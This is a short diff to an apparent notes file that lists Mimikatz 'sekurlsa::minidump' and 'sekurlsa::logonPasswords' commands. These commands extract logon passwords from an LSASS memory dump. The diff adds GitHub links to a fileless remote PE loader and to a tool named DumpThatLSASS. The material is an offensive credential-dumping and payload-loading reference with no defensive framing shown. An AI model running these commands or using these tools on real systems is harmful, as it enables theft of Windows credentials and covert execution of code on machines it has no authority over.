@@ -10,3 +10,8 @@ Mimikatz commands:
 sekurlsa::minidump <dump file full path>
 sekurlsa::logonPasswords 
   
+
+
+https://github.com/D1rkMtr/FilelessRemotePE/tree/main/RemotePE
+
+https://github.com/D1rkMtr/DumpThatLSASS
